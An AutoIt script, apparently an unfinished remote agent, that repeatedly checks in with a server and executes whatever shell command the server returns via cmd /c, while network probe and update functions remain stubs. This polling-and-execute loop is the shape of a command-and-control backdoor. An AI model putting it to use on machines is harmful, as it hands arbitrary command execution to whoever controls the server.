#include <Misc.au3>

#include "jintutil.au3"

_Singleton("SingleManager")

prt( @ScriptName & " start.")

$OpenAdslFlag = False
$RunningFlag = False

$checkDelay = 60000

; 打开网络连接
If Not NetAlive() Then
	OpenAdsl()
	$OpenAdslFlag = True
EndIf
; 检查哪个Server是可以使用的
checkServer()

While 1
	OpenAdsl()

    ; TODO 向服务器报到
	$clientId = IniRead( @ScriptDir & "\client.ini", "basic", "clientId", "jint")
	$reqUrl = $SERVER_URL & "/checkin?terminal=" & $clientId
	prt( $reqUrl )
	$ret = sendReq($reqUrl)
	prt("CheckIn: " & $ret)

	;看看有没有新任务
	$index = StringInStr($ret, " ")
	$taskType = StringLeft($ret, $index-1)
	$task = StringRight($ret, StringLen($ret)-$index)

	$ret = "no run"
	$checkDelay = 60000
	If $taskType == "cmd" Then
		$ret = runCmd($task)
	ElseIf $taskType == "page" Then
		$ret = runPage($task)
	ElseIf $taskType == "ping" Then
		$ret = runPing($task)
	ElseIf $taskType == "trace" Then
		$ret = runTrace($task)
	Else
		$checkDelay = 300000
	EndIf
	prt("task return: " & $ret)

	CloseAdsl()
	Sleep($checkDelay)
WEnd

Func runCmd($cmd)
	$ret = RunWait(@ComSpec & " /c " & $cmd,"")
	Return $ret
EndFunc

Func runPage($cmd)
	$ret = "will coding"
	Return $ret
EndFunc

Func runPing($cmd)
	$ret = "will coding"
	Return $ret
EndFunc

Func runTrace($cmd)
	$ret = "will coding"
	Return $ret
EndFunc

Func checkUpdate()
	; 从server端获得全部文件的版本和大小

	; 比较Server端版本和 ini文件中的版本，如果需要，更新之

	; 比较 Server 端大小和 当前文件大小，如果不一致，更新之

	;

	;

	;


EndFunc

